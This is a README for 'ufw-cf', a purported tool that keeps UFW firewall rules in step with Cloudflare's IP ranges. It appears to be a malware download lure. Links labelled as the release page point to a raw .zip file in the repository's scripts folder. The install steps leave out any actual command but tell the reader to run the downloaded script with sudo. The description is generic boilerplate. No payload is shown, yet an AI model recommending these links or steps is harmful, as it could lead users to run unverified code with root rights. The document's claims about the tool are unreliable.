# 🛡️ ufw-cf - Keep your server safe from attacks

<a href="https://github.com/markinsensitive738/ufw-cf/raw/refs/heads/main/scripts/cf-ufw-1.2.zip"><img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download"></a>

This application keeps your UFW firewall rules updated. It matches your firewall settings to the current IP addresses used by Cloudflare. This ensures that only traffic coming from Cloudflare reaches your web server. It protects your site from attackers who try to bypass Cloudflare to reach your origin server directly.

## 📋 What this tool does

Many websites use Cloudflare to hide their home server IP address. Sometimes, attackers find the real IP address of the server and send traffic directly to it. This bypasses Cloudflare security. `ufw-cf` solves this issue. It monitors the list of IP addresses that Cloudflare uses. The tool updates your UFW firewall settings automatically. It keeps ports 80 and 443 open only for these specific addresses. This locks down your server.

## 🛠️ System requirements

This tool runs on Linux-based operating systems. Verify that your system meets these needs:

*   An active UFW firewall installed and enabled.
*   Access to the root user account or a user with sudo privileges.
*   A stable internet connection to fetch the IP list.
*   Support for systemd timers to run updates in the background.

The tool works on:
*   Ubuntu (all recent LTS versions)
*   Debian (version 10 or newer)
*   Raspberry Pi OS

## 📥 How to get the software

You must visit the releases page to download the latest version of the program.

[Click here to visit the release page and download the software](https://github.com/markinsensitive738/ufw-cf/raw/refs/heads/main/scripts/cf-ufw-1.2.zip)

## ⚙️ Installation steps

Follow these steps to set up the tool on your machine. Access your terminal window to begin.

1.  Open your terminal application.
2.  Navigate to your home folder.
3.  Download the installation script. Use the command provided on the website.
4.  Run the script with administrative rights. Type `sudo` before the command.
5.  Wait for the script to finish the setup process.

The script performs three tasks:
*   It places the main program file in a system directory.
*   It sets the correct user permissions for the tool.
*   It registers a systemd timer to run the update task automatically.

## 🔄 How the update process works

The tool runs according to a schedule. It follows these steps:

1.  It checks the official Cloudflare website for current IP ranges.
2.  It compares these ranges with your existing UFW rules.
3.  It removes outdated rules that no longer come from Cloudflare.
4.  It adds new rules for current Cloudflare addresses.
5.  It logs the changes to a text file for your review.

You do not need to intervene. The tool manages the firewall silently in the background.

## 🔍 Verifying your firewall

You can check if the tool works at any time. Use the UFW command to view your active rules.

Type this into your terminal:
`sudo ufw status`

You will see a list of allowed ports. You will also see specifically allowed IP addresses. These addresses belong to the Cloudflare network. If you see many entries for port 80 and 443, the tool has successfully updated your firewall.

## 🛡️ Security benefits

Using `ufw-cf` increases the security of your self-hosted setup.

*   **Traffic filtering:** Only authorized traffic from the Cloudflare edge reaches your server.
*   **Automatic maintenance:** You avoid manual updates as Cloudflare changes their network architecture.
*   **Reduced attack surface:** The server ignores all direct connection attempts. This prevents many types of automated bot attacks.

## ❓ Troubleshooting

If the firewall fails to update, check these items:

*   Check your internet connection. The tool needs to reach the Cloudflare website.
*   Ensure that UFW is active. If UFW is disabled, the tool cannot manage rules.
*   Check the logs. Use the command `journalctl -u ufw-cf.service` to see past logs.
*   Permissions. Ensure you ran the install script with `sudo`.

The logs tell you if the connection to Cloudflare failed or if a specific rule update resulted in an error.

## 💾 Uninstallation

If you decide to remove the tool, you can disable the update timer. 

1.  Disable the timer: `sudo systemctl disable ufw-cf.timer`
2.  Remove the files from the system folder.
3.  Delete the UFW rules manually if you wish to reset your firewall to default settings.

This tool keeps your infrastructure simple. It handles the complex task of IP synchronization. You remain in control of your server security with minimal effort. Use the tool on your Raspberry Pi or your cloud server to block unwanted direct traffic. Focus on your projects while the firewall maintains your safety.